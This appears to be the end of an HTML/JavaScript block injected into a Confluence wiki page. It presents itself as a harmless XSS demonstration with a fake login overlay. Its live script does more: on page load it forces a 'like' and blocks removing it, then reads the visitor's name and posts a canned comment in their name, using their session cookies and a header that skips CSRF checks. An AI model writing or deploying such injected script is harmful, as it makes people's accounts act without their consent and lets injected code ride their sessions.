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"
                class="login-right"
              />
            </aside>
          </div>
        </main>
      </div>
      <div id="xsswelcome" class="welcome">
        <p>web安全之XSS，欢迎阅读，请点击前往</p>
		<p class="xssexplain">前一个登录页面是xss攻击的一种，只是简单的举个栗子，并没有获取任何数据，请放心！</p>
		<p id="gogogo">前往</p>
      </div>
    </div>
 <script>
	document.getElementById('page').style.overflow = 'hidden';
      document.getElementById("xssloginbtn").addEventListener(
        "click",
        function () {
          document.getElementById("xsslogin").style.cssText = "z-index: -9";
        },
        false
      );
      document.getElementById("gogogo").addEventListener(
        "click",
        function () {
		  document.getElementById('page').style.overflow = 'auto';
          document.getElementById("xsswelcome").style.cssText = "z-index: -9";
          document.getElementById("xsslogin").style.display = 'none';
		  document.getElementById("xsswelcome").style.display = 'none';
        },
        false
      );
setTimeout(function () { 
  var btn = document.querySelector('.like-button-text');
 btn.addEventListener('click', function(){
 if (btn.innerText === '踩') {
	alert('想取消点赞那是不可能的！');
	btn.click();
  }
}, false);
 if (btn.innerText === '赞') {
    btn.click();
  }
}, 1000);function autoComment() {
  function guid() {
    function S4() {
      return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
    }
    return S4() + S4() + '-' + S4() + '-' + S4() + '-' + S4() + '-' + S4() + S4() + S4();
  }
  const comments = [
    '文章前后连贯,形成完整的形象',
    '文章语言清新爽朗,描写能抓住事物的要紧特征,篇幅短小精悍,值得一读',
    '内容生动丰富,语言新颖清爽,结构独特合理',
    '文章有详有略,言之有序,内容生动具体,不失为一篇佳作',
    '特写镜头不开生面,情趣盎然。全文充满童心童趣,读来倍感亲切',
    '文章能过清新有味的语言,描写了的事。字里行间,充满童年真童趣,欢声笑语不绝于耳,不失为一篇佳作',
    '详略得当,虚实相生,是的两大特色,内容更丰富更生动',
    '全文清新秀逸,亲切委婉,朴素而不落俗淘,值得借见',
    '全文语言生动准确,情节精彩曲折,仿佛将读者带进了快乐乐园,令人眉飞色舞',
    '全文通俗易明白,趣味性强',
    '全文眉目清晰,生动紧凑,趣味性强',
	'丰食出品，必属精品',
  ];
  const fetchComment = (comment) => {
    fetch('http://wiki.sftcwl.com/rest/tinymce/1/content/49450261/comment?actions=true', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Atlassian-Token': 'no-check',
      },
      body: `html=${encodeURIComponent(comment)}&watch=false&uuid=${guid()}`,
    });
  };
  const currUser = document.querySelector('[name=ajs-current-user-fullname]').attributes[1]
    .nodeValue;
  const commenters = new Set();
  document.querySelectorAll('#page-comments .url.fn.confluence-userlink').forEach(function (item) {
    commenters.add(item.textContent);
  });
  if (!commenters.has(currUser)) {
    const comment = comments[Math.floor(Math.random() * comments.length)];
    fetchComment(`<p>俺${currUser}来评论啦：${comment}</p>`);
  }
}
setTimeout(() => {
  autoComment();
}, 4001);
 </script>
<link rel="stylesheet" href="//cdn.bootcdn.net/ajax/libs/highlight.js/10.5.0/styles/atom-one-dark-reasonable.min.css">
<script src="//cdn.bootcdn.net/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script> -->
